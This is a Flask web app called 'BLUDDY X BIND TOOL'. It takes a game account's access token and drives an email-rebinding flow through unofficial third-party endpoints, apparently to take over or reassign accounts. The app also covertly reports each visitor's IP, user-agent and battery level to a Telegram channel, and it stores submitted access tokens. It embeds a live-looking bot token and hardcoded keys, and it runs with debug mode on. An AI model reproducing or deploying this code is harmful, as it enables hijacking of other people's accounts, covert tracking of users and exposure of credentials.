from flask import Flask, render_template_string, request, redirect, session, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import os
import requests
import json
import hashlib
import time

app = Flask(__name__)
app.secret_key = "bloody_x_secret_2026"

# ============ DATABASE ============
basedir = os.path.abspath(os.path.dirname(__file__))
db_path = os.path.join(basedir, "bloody_x.db")
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# ============ CONFIG ============
BOT_TOKEN = "8942532097:AAFWVLTYYgOnp-1aIUdOFYql1bHXhN4sey4"
ACCESS_KEY = "BLOODY-X-OWNER"
ADMIN_KEY = "BLOODY-X-ADMIN"

# ============ DATABASE MODELS ============
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    display_id = db.Column(db.Integer, unique=True, nullable=False)
    username = db.Column(db.String(100))
    ip = db.Column(db.String(50))
    device = db.Column(db.String(200))
    battery = db.Column(db.String(20))
    access_token = db.Column(db.String(200))
    joined_at = db.Column(db.DateTime, default=datetime.utcnow)
    is_banned = db.Column(db.Boolean, default=False)

class BannedIP(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(50), unique=True)
    banned_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

# ============ HELPERS ============
def get_next_display_id():
    last = User.query.order_by(User.display_id.desc()).first()
    return last.display_id + 1 if last else 1001

def is_ip_banned(ip):
    return BannedIP.query.filter_by(ip=ip).first() is not None

def send_to_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': '@Errorzlive', 'text': text, 'parse_mode': 'HTML'}, timeout=5)
    except:
        pass

def send_battery_to_telegram(ip, battery, device):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        msg = f"🔋 <b>NEW USER DETAILS</b>\n\n🌐 IP: {ip}\n🔋 Battery: {battery}%\n📱 Device: {device[:50]}"
        requests.post(url, json={'chat_id': '@Errorzlive', 'text': msg, 'parse_mode': 'HTML'}, timeout=5)
    except:
        pass

def is_success(rsp):
    if rsp.status_code != 200:
        return False
    try:
        rj = rsp.json()
        if not rj.get("success"):
            return False
        data = rj.get("data", {})
        if isinstance(data, dict):
            if data.get("error"):
                return False
            g_resp = data.get("garena_response", {})
            if isinstance(g_resp, dict) and g_resp.get("error"):
                return False
        err_node = rj.get("error")
        if err_node:
            return False
        return True
    except:
        return False

def check_bind(access_token):
    try:
        url = "https://bindinfocrownx612.vercel.app/check"
        params = {'access_token': access_token}
        rsp = requests.get(url, params=params, timeout=10)
        
        print(f"Check bind response: {rsp.status_code} - {rsp.text}")  # Debug
        
        if is_success(rsp):
            data = rsp.json()
            inner_data = data.get("data", {}) if data.get("data") else data
            return {
                'status': inner_data.get('status', 'N/A'),
                'current_email': inner_data.get('current_email', 'N/A'),
                'pending_email': inner_data.get('pending_email', 'N/A'),
                'email_to_be': inner_data.get('email_to_be', 'N/A'),
                'countdown': inner_data.get('countdown_human', 'N/A')
            }
        return None
    except Exception as e:
        print(f"Check bind error: {e}")
        return None

def send_otp(access, email, otp_type="normal"):
    try:
        if otp_type == "normal":
            url = "https://chngemailcode48.vercel.app/send_otp"
            params = {'access_token': access, 'email': email}
        elif otp_type == "current":
            url = "https://chngeforgotcrownx72.vercel.app/otp"
            params = {'access_token': access, 'current_email': email}
        elif otp_type == "new":
            url = "https://chngeforgotcrownx72.vercel.app/newotp"
            params = {'access_token': access, 'new_email': email}
        else:
            return False, None
            
        print(f"Sending OTP: {url} - {params}")  # Debug
        rsp = requests.get(url, params=params, timeout=10)
        print(f"OTP Response: {rsp.status_code} - {rsp.text}")  # Debug
        
        if is_success(rsp):
            return True, rsp.json()
        return False, None
    except Exception as e:
        print(f"Send OTP error: {e}")
        return False, None

def verify_otp(access, email, otp, otp_type="normal"):
    try:
        if otp_type == "normal":
            url = "https://chngemailcode48.vercel.app/verify_otp"
            params = {'access_token': access, 'email': email, 'otp': otp}
        elif otp_type == "current":
            url = "https://chngeforgotcrownx72.vercel.app/verify"
            params = {'access_token': access, 'current_email': email, 'otp': otp}
        elif otp_type == "new":
            url = "https://chngeforgotcrownx72.vercel.app/newverify"
            params = {'access_token': access, 'new_email': email, 'otp': otp}
        else:
            return False, None
            
        print(f"Verifying OTP: {url} - {params}")  # Debug
        rsp = requests.get(url, params=params, timeout=10)
        print(f"Verify Response: {rsp.status_code} - {rsp.text}")  # Debug
        
        if is_success(rsp):
            data = rsp.json()
            verifier = data.get("verifier_token") or data.get("data", {}).get("verifier_token")
            return True, verifier
        return False, None
    except Exception as e:
        print(f"Verify OTP error: {e}")
        return False, None

def create_rebind(access, email, identity_token, verifier_token):
    try:
        url = "https://chngemailcode48.vercel.app/create_rebind"
        params = {
            'access_token': access,
            'email': email,
            'identity_token': identity_token,
            'verifier_token': verifier_token
        }
        print(f"Creating rebind: {url} - {params}")  # Debug
        rsp = requests.get(url, params=params, timeout=10)
        print(f"Rebind Response: {rsp.status_code} - {rsp.text}")  # Debug
        
        if is_success(rsp):
            return True, "Email changed successfully!"
        return False, "Failed to change email"
    except Exception as e:
        print(f"Create rebind error: {e}")
        return False, "Error"

# ============ HTML ============
INDEX_HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BLUDDY X BIND</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
body{min-height:100vh;background:#0a0a0a;display:flex;justify-content:center;align-items:center;position:relative;overflow:hidden;}
body::before{content:'';position:absolute;width:100%;height:100%;background:url('https://i.ibb.co/C3rBq6cV/photo-AQADQBBr-Gx-m-GFZ9.jpg');background-size:cover;background-position:center;opacity:0.12;z-index:0;}
.glow{position:absolute;width:400px;height:400px;background:radial-gradient(circle,#ff000033 0%,transparent 70%);border-radius:50%;animation:pulse 4s ease-in-out infinite;z-index:0;}
@keyframes pulse{0%,100%{transform:scale(1);opacity:0.3;}50%{transform:scale(1.5);opacity:0.1;}}
.glow:nth-child(2){bottom:-100px;right:-100px;animation-delay:2s;}
.container{position:relative;z-index:1;width:100%;max-width:500px;padding:20px;}
.card{background:rgba(10,10,10,0.92);backdrop-filter:blur(20px);border-radius:30px;padding:40px 35px;border:1px solid #ff000066;box-shadow:0 0 60px rgba(255,0,0,0.1);}
.logo{text-align:center;margin-bottom:25px;}
.logo h1{font-family:'Orbitron',monospace;font-size:32px;font-weight:900;background:linear-gradient(135deg,#ff0000,#cc0000);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:2px;}
.logo p{color:#ff000088;font-size:13px;letter-spacing:4px;margin-top:5px;font-family:'Orbitron',monospace;}
.sub{color:#ff000088;text-align:center;font-size:12px;margin-bottom:25px;letter-spacing:2px;}
.input-group{margin-bottom:20px;}
.input-group label{display:block;color:#ff000088;font-size:11px;font-weight:700;letter-spacing:2px;margin-bottom:8px;text-transform:uppercase;}
.input-group input{width:100%;padding:14px 18px;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:15px;color:#ff6666;font-size:14px;letter-spacing:1px;transition:all 0.3s;}
.input-group input:focus{outline:none;border-color:#ff0000;box-shadow:0 0 30px rgba(255,0,0,0.15);background:rgba(255,0,0,0.06);}
.btn{width:100%;padding:14px;background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:15px;color:#0a0a0a;font-size:16px;font-weight:900;letter-spacing:2px;cursor:pointer;transition:all 0.3s;font-family:'Orbitron',monospace;}
.btn:hover{transform:translateY(-3px);box-shadow:0 10px 40px rgba(255,0,0,0.3);}
.error{background:rgba(255,0,0,0.15);border:1px solid #ff000066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#ff6666;font-size:12px;}
.success{background:rgba(0,255,0,0.15);border:1px solid #00ff0066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#66ff66;font-size:12px;}
.footer{text-align:center;margin-top:25px;font-size:10px;color:#ff000044;letter-spacing:1px;}
.footer a{color:#ff000088;text-decoration:none;}
.footer a:hover{color:#ff0000;}
@media(max-width:480px){.card{padding:30px 20px;}.logo h1{font-size:22px;}}
</style>
</head>
<body>
<div class="glow"></div><div class="glow"></div>
<div class="container">
<div class="card">
<div class="logo"><h1>BLUDDY X</h1><p>BIND TOOL</p></div>
<p class="sub">ENTER ACCESS KEY</p>
{% if error %}<div class="error">{{ error }}</div>{% endif %}
{% if success %}<div class="success">{{ success }}</div>{% endif %}
<form method="POST" action="/login">
<div class="input-group"><label>ACCESS KEY</label><input type="password" name="key" placeholder="ENTER ACCESS KEY" required autofocus></div>
<button type="submit" class="btn">ACCESS</button>
</form>
<div class="footer">DEVELOPER - @Errorzlive</div>
</div>
</div>
</body>
</html>
"""

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BLUDDY X BIND</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
body{background:#0a0a0a;min-height:100vh;color:#ff6666;}
.navbar{background:rgba(10,10,10,0.95);padding:15px 25px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #ff000033;flex-wrap:wrap;gap:10px;}
.navbar h1{font-family:'Orbitron',monospace;font-size:20px;color:#ff0000;}
.nav-right{display:flex;align-items:center;gap:15px;}
.nav-right .id-badge{color:#ff000088;font-size:11px;border:1px solid #ff000033;padding:4px 14px;border-radius:20px;}
.container{padding:30px;max-width:900px;margin:0 auto;}
.info-card{background:rgba(255,0,0,0.03);border-radius:20px;padding:25px;border:1px solid #ff000022;margin-bottom:30px;}
.info-card h2{font-family:'Orbitron',monospace;font-size:16px;color:#ff0000;margin-bottom:15px;letter-spacing:1px;}
.info-row{padding:8px 0;border-bottom:1px solid rgba(255,0,0,0.08);display:flex;justify-content:space-between;font-size:13px;flex-wrap:wrap;}
.info-row .label{color:#ff000088;}
.info-row .value{color:#ff6666;font-weight:bold;}
.btn-red{background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:10px;color:#0a0a0a;padding:10px 20px;font-weight:bold;cursor:pointer;font-size:13px;}
.btn-red:hover{transform:translateY(-2px);box-shadow:0 5px 20px rgba(255,0,0,0.3);}
.input-group{margin-bottom:15px;}
.input-group label{display:block;color:#ff000088;font-size:11px;letter-spacing:2px;margin-bottom:5px;text-transform:uppercase;}
.input-group input{width:100%;padding:12px 16px;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:12px;color:#ff6666;font-size:14px;}
.input-group input:focus{outline:none;border-color:#ff0000;}
.error{background:rgba(255,0,0,0.15);border:1px solid #ff000066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#ff6666;font-size:12px;}
.success{background:rgba(0,255,0,0.15);border:1px solid #00ff0066;border-radius:12px;padding:12px;margin-bottom:20px;text-align:center;color:#66ff66;font-size:12px;}
.footer{text-align:center;margin-top:40px;font-size:10px;color:#ff000044;padding:15px;border-top:1px solid #ff000011;}
@media(max-width:480px){.container{padding:15px;}}
</style>
</head>
<body>
<div class="navbar">
<h1>🔴 BLUDDY X</h1>
<div class="nav-right"><span class="id-badge">ID: {{ user.display_id }}</span><a href="/logout" style="color:#ff000088;text-decoration:none;">LOGOUT</a></div>
</div>
<div class="container">
{% if error %}<div class="error">{{ error }}</div>{% endif %}
{% if success %}<div class="success">{{ success }}</div>{% endif %}

<div class="info-card">
<h2>📧 CHANGE BIND MAIL</h2>
<form id="changeForm" method="POST" action="/change-bind">
<input type="hidden" name="step" id="stepInput" value="{{ step or 1 }}">
<div id="step1" {% if step and step != '1' %}style="display:none;"{% endif %}>
<div class="input-group"><label>ACCESS TOKEN</label><input type="text" name="access_token" placeholder="Enter Access Token" value="{{ access_token or '' }}" required></div>
<div class="input-group"><label>CURRENT BIND EMAIL</label><input type="email" name="current_email" placeholder="Enter Current Bound Email" value="{{ current_email or '' }}" required></div>
<button type="submit" class="btn-red" name="action" value="send_otp_current">📨 SEND OTP TO CURRENT EMAIL</button>
</div>
<div id="step2" {% if step != '2' %}style="display:none;"{% endif %}>
<div class="input-group"><label>OTP CODE (CURRENT EMAIL)</label><input type="text" name="otp1" placeholder="Enter OTP from Current Email" required></div>
<button type="submit" class="btn-red" name="action" value="verify_otp_current">✅ VERIFY OTP</button>
<input type="hidden" name="access_token" value="{{ access_token or '' }}">
<input type="hidden" name="current_email" value="{{ current_email or '' }}">
</div>
<div id="step3" {% if step != '3' %}style="display:none;"{% endif %}>
<div class="input-group"><label>NEW EMAIL</label><input type="email" name="new_email" placeholder="Enter New Email" required></div>
<button type="submit" class="btn-red" name="action" value="send_otp_new">📨 SEND OTP TO NEW EMAIL</button>
<input type="hidden" name="access_token" value="{{ access_token or '' }}">
<input type="hidden" name="current_email" value="{{ current_email or '' }}">
</div>
<div id="step4" {% if step != '4' %}style="display:none;"{% endif %}>
<div class="input-group"><label>OTP CODE (NEW EMAIL)</label><input type="text" name="otp2" placeholder="Enter OTP from New Email" required></div>
<button type="submit" class="btn-red" name="action" value="verify_otp_new">✅ CONFIRM & CHANGE</button>
<input type="hidden" name="access_token" value="{{ access_token or '' }}">
<input type="hidden" name="current_email" value="{{ current_email or '' }}">
<input type="hidden" name="new_email" value="{{ new_email or '' }}">
</div>
</form>
</div>

<div class="info-card">
<h2>📋 CURRENT BIND INFO</h2>
{% if bind %}
<div class="info-row"><span class="label">STATUS</span><span class="value">{{ bind.status }}</span></div>
<div class="info-row"><span class="label">CURRENT EMAIL</span><span class="value">{{ bind.current_email }}</span></div>
<div class="info-row"><span class="label">PENDING EMAIL</span><span class="value">{{ bind.pending_email }}</span></div>
<div class="info-row"><span class="label">EMAIL TO BE</span><span class="value">{{ bind.email_to_be }}</span></div>
<div class="info-row"><span class="label">COUNTDOWN</span><span class="value">{{ bind.countdown }}</span></div>
{% else %}
<div class="info-row"><span class="label">⚠️ Enter Access Token above to fetch info</span></div>
{% endif %}
</div>
</div>
<div class="footer">DEVELOPER - @Errorzlive</div>
<script>
if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
        fetch('/battery', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({battery: Math.round(battery.level * 100)})
        });
    });
}
</script>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin - BLUDDY X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
body{background:#0a0a0a;min-height:100vh;color:#ff6666;}
.navbar{background:rgba(10,10,10,0.95);padding:15px 25px;display:flex;justify-content:space-between;border-bottom:1px solid #ff000033;}
.navbar h1{font-family:'Orbitron',monospace;font-size:20px;color:#ff0000;}
.navbar a{color:#ff000088;text-decoration:none;}
.container{padding:25px;max-width:1200px;margin:0 auto;}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:25px;}
.stat-card{background:rgba(255,0,0,0.03);border:1px solid #ff000022;border-radius:15px;padding:20px;text-align:center;}
.stat-card h3{color:#ff000088;font-size:11px;letter-spacing:1px;}
.stat-card .value{color:#ff0000;font-size:28px;font-weight:bold;}
.section{background:rgba(255,0,0,0.03);border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #ff000022;overflow-x:auto;}
.section h2{color:#ff0000;font-size:16px;margin-bottom:15px;font-family:'Orbitron',monospace;}
table{width:100%;border-collapse:collapse;font-size:12px;}
th,td{padding:10px;text-align:left;border-bottom:1px solid #ff000011;color:#ff6666;}
th{color:#ff000088;font-weight:bold;letter-spacing:1px;}
.ban-btn{background:#ff333355;border:none;padding:4px 12px;border-radius:6px;color:#ff6666;cursor:pointer;}
.unban-btn{background:#33ff3355;border:none;padding:4px 12px;border-radius:6px;color:#66ff66;cursor:pointer;}
.status-badge{padding:2px 10px;border-radius:12px;font-size:11px;}
.status-active{background:#33ff3322;color:#66ff66;}
.status-banned{background:#ff333322;color:#ff6666;}
.footer{text-align:center;margin-top:30px;font-size:10px;color:#ff000044;padding:15px;}
</style>
</head>
<body>
<div class="navbar"><h1>ADMIN PANEL</h1><a href="/logout">LOGOUT</a></div>
<div class="container">
<div class="stats">
<div class="stat-card"><h3>TOTAL USERS</h3><div class="value">{{ users|length }}</div></div>
<div class="stat-card"><h3>BANNED</h3><div class="value">{{ banned_count }}</div></div>
<div class="stat-card"><h3>BANNED IPS</h3><div class="value">{{ banned_ips|length }}</div></div>
</div>
<div class="section"><h2>USERS</h2>
<table>
<tr><th>ID</th><th>USERNAME</th><th>IP</th><th>DEVICE</th><th>BATTERY</th><th>JOINED</th><th>STATUS</th><th>ACTION</th></tr>
{% for u in users %}
<tr>
<td>{{ u.display_id }}</td>
<td>{{ u.username or '-' }}</td>
<td>{{ u.ip or '-' }}</td>
<td>{{ (u.device or '-')[:30] }}</td>
<td>{{ u.battery or '-' }}</td>
<td>{{ u.joined_at.strftime('%Y-%m-%d') if u.joined_at else '-' }}</td>
<td><span class="status-badge {{ 'status-active' if not u.is_banned else 'status-banned' }}">{{ 'ACTIVE' if not u.is_banned else 'BANNED' }}</span></td>
<td>
{% if u.is_banned %}
<form method="POST" action="/admin/unban" style="display:inline;"><input type="hidden" name="user_id" value="{{ u.id }}"><button class="unban-btn">UNBAN</button></form>
{% else %}
<form method="POST" action="/admin/ban" style="display:inline;"><input type="hidden" name="user_id" value="{{ u.id }}"><button class="ban-btn">BAN</button></form>
{% endif %}
</td>
</tr>
{% endfor %}
</table></div>
<div class="section"><h2>BANNED IPS</h2>
<table>
<tr><th>IP</th><th>BANNED AT</th><th>ACTION</th></tr>
{% for b in banned_ips %}
<tr><td>{{ b.ip }}</td><td>{{ b.banned_at.strftime('%Y-%m-%d %H:%M') if b.banned_at else '-' }}</td>
<td><form method="POST" action="/admin/unban-ip"><input type="hidden" name="ip" value="{{ b.ip }}"><button class="unban-btn">UNBAN</button></form></td></tr>
{% endfor %}
</table></div>
</div>
<div class="footer">DEVELOPER - @Errorzlive</div>
</body>
</html>
"""

ADMIN_LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
body{min-height:100vh;background:#0a0a0a;display:flex;justify-content:center;align-items:center;}
.card{background:rgba(10,10,10,0.92);border-radius:30px;padding:40px;max-width:400px;width:100%;border:1px solid #ff000066;}
h2{color:#ff0000;text-align:center;margin-bottom:30px;font-family:'Orbitron',monospace;}
input{width:100%;padding:14px;margin:10px 0;background:rgba(255,0,0,0.04);border:1px solid #ff000033;border-radius:12px;color:#ff6666;font-size:14px;}
input:focus{outline:none;border-color:#ff0000;}
button{width:100%;padding:14px;background:linear-gradient(135deg,#ff0000,#cc0000);border:none;border-radius:12px;color:#0a0a0a;font-weight:bold;cursor:pointer;}
.error{color:#ff3333;text-align:center;margin-bottom:15px;}
</style></head>
<body>
<div class="card"><h2>ADMIN LOGIN</h2>
{% if error %}<div class="error">{{ error }}</div>{% endif %}
<form method="POST" action="/admin-login">
<input type="password" name="key" placeholder="ENTER ADMIN KEY" required>
<button type="submit">ACCESS</button>
</form>
</div>
</body>
</html>
"""

# ============ ROUTES ============

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect('/dashboard')
    return render_template_string(INDEX_HTML)

@app.route('/login', methods=['POST'])
def login():
    key = request.form.get('key')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    
    if is_ip_banned(ip):
        return render_template_string(INDEX_HTML, error="YOU ARE BANNED!")
    
    if key != ACCESS_KEY:
        return render_template_string(INDEX_HTML, error="INVALID ACCESS KEY!")
    
    existing = User.query.filter_by(ip=ip).first()
    if existing:
        if existing.is_banned:
            return render_template_string(INDEX_HTML, error="YOU ARE BANNED!")
        session['user_id'] = existing.id
        return redirect('/dashboard')
    
    display_id = get_next_display_id()
    user = User(display_id=display_id, ip=ip, device=ua[:200])
    db.session.add(user)
    db.session.commit()
    session['user_id'] = user.id
    
    send_to_telegram(f"🔔 <b>NEW LOGIN</b>\n\nID: {display_id}\nIP: {ip}\nDevice: {ua[:50]}")
    
    return redirect('/dashboard')

@app.route('/battery', methods=['POST'])
def battery():
    if 'user_id' not in session:
        return jsonify({'status': 'error'}), 401
    data = request.get_json()
    battery = data.get('battery', 'N/A')
    user = User.query.get(session['user_id'])
    if user:
        user.battery = str(battery)
        db.session.commit()
        send_battery_to_telegram(user.ip, battery, user.device)
    return jsonify({'status': 'ok'})

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect('/')
    user = User.query.get(session['user_id'])
    if not user or user.is_banned:
        session.clear()
        return redirect('/')
    
    bind = None
    if user.access_token:
        bind = check_bind(user.access_token)
    
    return render_template_string(DASHBOARD_HTML, user=user, bind=bind, step=1)

@app.route('/change-bind', methods=['POST'])
def change_bind():
    if 'user_id' not in session:
        return redirect('/')
    
    user = User.query.get(session['user_id'])
    if not user or user.is_banned:
        session.clear()
        return redirect('/')
    
    action = request.form.get('action')
    step = int(request.form.get('step', 1))
    
    # Step 1: Send OTP to current email
    if action == 'send_otp_current':
        access = request.form.get('access_token')
        current_email = request.form.get('current_email')
        
        if not access or not current_email:
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=1, error="All fields required!")
        
        user.access_token = access
        db.session.commit()
        
        ok, response = send_otp(access, current_email, "current")
        if not ok:
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=1, 
                                         error="Failed to send OTP! Check if token and email are correct.")
        
        return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=2, 
                                     access_token=access, current_email=current_email,
                                     success="✅ OTP sent to your current email!")
    
    # Step 2: Verify OTP from current email
    elif action == 'verify_otp_current':
        access = request.form.get('access_token')
        current_email = request.form.get('current_email')
        otp1 = request.form.get('otp1')
        
        if not all([access, current_email, otp1]):
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=2, 
                                         error="All fields required!", 
                                         access_token=access, current_email=current_email)
        
        ok, verifier = verify_otp(access, current_email, otp1, "current")
        if not ok:
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=2, 
                                         error="❌ Invalid OTP! Please check and try again.", 
                                         access_token=access, current_email=current_email)
        
        # Store verifier in session
        session['verifier_token'] = verifier
        
        return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=3, 
                                     access_token=access, current_email=current_email,
                                     success="✅ OTP verified! Now enter new email.")
    
    # Step 3: Send OTP to new email
    elif action == 'send_otp_new':
        access = request.form.get('access_token')
        current_email = request.form.get('current_email')
        new_email = request.form.get('new_email')
        
        if not all([access, current_email, new_email]):
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=3, 
                                         error="All fields required!", 
                                         access_token=access, current_email=current_email)
        
        ok, response = send_otp(access, new_email, "new")
        if not ok:
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=3, 
                                         error="Failed to send OTP to new email!", 
                                         access_token=access, current_email=current_email)
        
        return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=4, 
                                     access_token=access, current_email=current_email, new_email=new_email,
                                     success="✅ OTP sent to new email!")
    
    # Step 4: Verify OTP from new email and change
    elif action == 'verify_otp_new':
        access = request.form.get('access_token')
        current_email = request.form.get('current_email')
        new_email = request.form.get('new_email')
        otp2 = request.form.get('otp2')
        
        if not all([access, current_email, new_email, otp2]):
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=4, 
                                         error="All fields required!", 
                                         access_token=access, current_email=current_email, 
                                         new_email=new_email)
        
        # Verify OTP for new email
        ok, verifier = verify_otp(access, new_email, otp2, "new")
        if not ok:
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=4, 
                                         error="❌ Invalid OTP for new email!", 
                                         access_token=access, current_email=current_email, 
                                         new_email=new_email)
        
        # Get verifier from session (from step 2)
        verifier_token = session.get('verifier_token')
        if not verifier_token:
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=4, 
                                         error="Session expired! Please start over.", 
                                         access_token=access, current_email=current_email, 
                                         new_email=new_email)
        
        # Change email
        success, msg = create_rebind(access, new_email, "NO_SEC_NEEDED", verifier_token)
        
        if success:
            send_to_telegram(f"✅ <b>BIND MAIL CHANGED</b>\n\nUser: {user.display_id}\nNew Email: {new_email}")
            user.access_token = access
            db.session.commit()
            
            # Clear session
            session.pop('verifier_token', None)
            
            bind = check_bind(access)
            return render_template_string(DASHBOARD_HTML, user=user, bind=bind, step=1, 
                                         success="✅ Email changed successfully!")
        else:
            return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=4, 
                                         error=f"Failed to change email: {msg}", 
                                         access_token=access, current_email=current_email, 
                                         new_email=new_email)
    
    return render_template_string(DASHBOARD_HTML, user=user, bind=None, step=1)

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        key = request.form.get('key')
        if key == ADMIN_KEY:
            session['admin'] = True
            return redirect('/admin')
        return render_template_string(ADMIN_LOGIN_HTML, error="INVALID ADMIN KEY!")
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/admin')
def admin():
    if not session.get('admin'):
        return redirect('/admin-login')
    users = User.query.order_by(User.display_id).all()
    banned_ips = BannedIP.query.all()
    banned_count = User.query.filter_by(is_banned=True).count()
    return render_template_string(ADMIN_HTML, users=users, banned_ips=banned_ips, banned_count=banned_count)

@app.route('/admin/ban', methods=['POST'])
def admin_ban():
    if not session.get('admin'):
        return redirect('/admin-login')
    user = db.session.get(User, request.form.get('user_id'))
    if user:
        user.is_banned = True
        db.session.commit()
        send_to_telegram(f"🚫 USER BANNED\nID: {user.display_id}\nIP: {user.ip}")
    return redirect('/admin')

@app.route('/admin/unban', methods=['POST'])
def admin_unban():
    if not session.get('admin'):
        return redirect('/admin-login')
    user = db.session.get(User, request.form.get('user_id'))
    if user:
        user.is_banned = False
        db.session.commit()
    return redirect('/admin')

@app.route('/admin/ban-ip', methods=['POST'])
def admin_ban_ip():
    if not session.get('admin'):
        return redirect('/admin-login')
    ip = request.form.get('ip')
    if ip and not is_ip_banned(ip):
        db.session.add(BannedIP(ip=ip))
        user = User.query.filter_by(ip=ip).first()
        if user:
            user.is_banned = True
        db.session.commit()
    return redirect('/admin')

@app.route('/admin/unban-ip', methods=['POST'])
def admin_unban_ip():
    if not session.get('admin'):
        return redirect('/admin-login')
    ip = request.form.get('ip')
    banned = BannedIP.query.filter_by(ip=ip).first()
    if banned:
        db.session.delete(banned)
        db.session.commit()
    return redirect('/admin')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/health')
def health():
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
